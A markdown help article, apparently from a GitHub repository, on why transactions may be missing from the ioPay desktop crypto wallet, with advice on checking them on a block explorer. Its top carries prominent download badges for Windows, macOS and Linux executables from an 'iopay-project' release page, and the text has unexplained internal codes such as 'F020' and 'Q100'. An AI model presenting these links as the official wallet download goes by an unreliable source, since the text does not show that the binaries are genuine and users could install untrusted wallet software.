![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Missing Transaction History in ioPay Wallet

Transaction history in ioPay Wallet is a **read of the chain**, not a ledger the app keeps (F020). So a missing entry has four possible explanations, and three of them mean the history is fine - you are looking in the wrong place.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## The four causes

**1. The app is behind.** History and balances come from the same read; if the app cannot refresh, both look stale. Refresh, then check whether the balance is also off - if both are, it is connectivity: ["Error fetching timestamp"](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md).

**2. The wrong account.** One phrase can hold several accounts, each with its own `io1...` and `0x...` addresses. A transaction made from another account will not appear here.

**3. The wrong chain.** The same address string on IoTeX and on another EVM chain is a different account with different history. A bridge transfer has a transaction on **each** side; the app shows the IoTeX side.

**4. It never happened.** A broadcast failure leaves no transaction behind, because nothing reached the network. [Stuck and pending](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md) explains how to tell that apart from a pending transaction.

## If the build is old

The problems users reported were fixed in **v2.0.2, 19 November 2026** (F003), and an old build can also display history differently from a current one, so updating is the cheap step before investigating anything. Your accounts are unaffected by the update.

## Checking a transaction yourself

Q100 in practice. An explorer reads the chain directly, which makes it the tiebreaker:

1. **Look up your address.** You should see the same balance the app shows, and the transactions it lists.
2. **Look up the transaction hash.** A hash proves the transaction exists and shows:
   - which address it went to,
   - the **status** (success or reverted),
   - the **block number** (when it was included),
   - the **fee paid**.
3. **Compare with the app.** If the explorer shows a transaction the app does not, the app's view is behind - refresh, check connectivity, update.
4. **If the explorer shows nothing at your address**, the funds went somewhere else. Check the address you gave or pasted, and which format it was in ([`io1...` vs `0x...`](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md)).

## What a wallet history does not show

**Every internal movement.** A contract interaction can move value without producing a separate row in a wallet's list. The explorer's detail view is where those appear.

**Other chains.** A bridge's destination transaction belongs to the destination chain's explorer.

**Off-chain events.** A device earning reported by a project, or an exchange's internal transfer, is not an IoTeX transaction until something settles on-chain.

## When it is genuinely wrong

If the explorer shows a transaction, the app is current, the account and chain are right, and the entry still does not appear - that is a display bug worth reporting. This repository has no public issue history, so there is no thread to compare against; that limitation is worth knowing before you spend an hour on it.

## FAQ

**Why is a transaction missing from my ioPay history?**
Usually a stale view, a different account, or a different chain. Less often, the transaction never broadcast, so there is nothing to show.

**How do I check my IOTX transactions on a block explorer?**
Search the address or the transaction hash on an IoTeX explorer; the hash gives status, block number, fee and destination.

**Can history be restored?**
It is read from the chain, so it appears when the app can read the chain again. There is nothing to restore.

**Does the app keep history if I reinstall?**
The chain does. Reinstalling and importing the account shows the same history.

**Why does the explorer show more transactions than the wallet?**
Contract interactions and internal movements may not appear as separate rows in a wallet view.

## Why history arrives in pieces

A wallet does not hold your history; it asks a node for it, and it receives it in chunks rather than in one answer. That is why a fresh install, a restored account or a long-dormant address can show recent transactions while older ones are still loading - or look empty for a moment before filling in.

Three consequences follow, and all three look like bugs if you do not expect them:

**Older entries take longer than recent ones.** The read has to walk back further, and a slow or interrupted fetch can leave the older end missing until it completes.

**A restored account may show less than the old installation did.** The chain has everything; the new app has fetched only what it has asked for so far.

**An entry can appear after you have given up on it.** Refreshing later is not a repair, it is a second read of the same chain - but it is the right first move before concluding anything.

## Rebuilding a record outside the wallet

If you need a record rather than a view - for accounting, for a dispute with a counterparty, or to reconstruct a year of staking - the explorer is the better source, because it reads the chain rather than a client's cached copy of it.

Collect five fields per transaction: the **hash**, the **block number**, the **fee paid**, the **counterparty address**, and the **status** at inclusion. Those are what an auditor or a counterparty can verify independently, and none of them depends on this app at all.

The app's own export does the same job more conveniently (F027), with one caveat: it only knows what this installation fetched, so transactions made from the mobile app or from a watch-only entry may be missing from it. If the record has to be complete, take it from the explorer and keep the wallet's export as a convenience copy rather than the authority.


---

*History behaviour follows the app's chain-read model (F020); chain identity from F030; version from the release.*
